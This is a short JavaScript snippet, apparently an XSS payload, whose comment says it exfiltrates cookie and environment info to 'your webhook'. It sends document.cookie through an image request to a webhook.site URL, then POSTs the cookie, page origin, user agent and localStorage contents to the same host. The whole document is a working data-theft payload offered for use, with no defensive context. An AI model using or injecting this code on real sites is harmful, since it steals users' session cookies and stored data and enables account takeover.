// Exfil cookie and environment info to your webhook
new Image().src = 'https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6?cookie=' + encodeURIComponent(document.cookie);

fetch('https://webhook.site/05a4982f-0a9e-466b-b20d-37e3ae1274d6', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    cookie: document.cookie,
    origin: location.origin,
    userAgent: navigator.userAgent,
    localStorage: localStorage
  })
});
